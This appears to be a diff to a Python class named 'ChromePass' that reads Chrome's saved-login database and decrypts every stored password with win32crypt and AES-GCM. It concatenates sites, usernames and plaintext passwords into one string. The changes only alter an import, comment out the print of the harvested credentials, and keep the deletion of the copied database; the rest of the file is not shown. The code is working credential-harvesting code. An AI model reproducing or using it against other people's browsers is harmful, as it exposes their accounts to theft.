@@ -4,7 +4,7 @@ import os
 import shutil
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+import Cryptodome.Cipher.AES
 
 class ChromePass:
     """
@@ -43,7 +43,7 @@ class ChromePass:
         #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
         #Encrypted password is 192 bits
         encrypted = raw_encrypted[15:-16]
-        cipher =  AES.new(key, AES.MODE_GCM, AES_vector)
+        cipher =  Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_GCM, AES_vector)
         decrypted = cipher.decrypt(encrypted)
         decrypted = decrypted.decode()  
         return decrypted
@@ -63,7 +63,7 @@ class ChromePass:
         for tuple in cursor.fetchall():
             if (tuple[0] != "" and tuple[1] != "" and tuple[2] != ""):
                 login_data += tuple[0] + "," + tuple[1] + "," + self.decrypt(tuple[2], key) + "|||"
-        print(login_data)
+        # print(login_data)
         cursor.close()
         conn.close()
         os.remove("logindata.db")
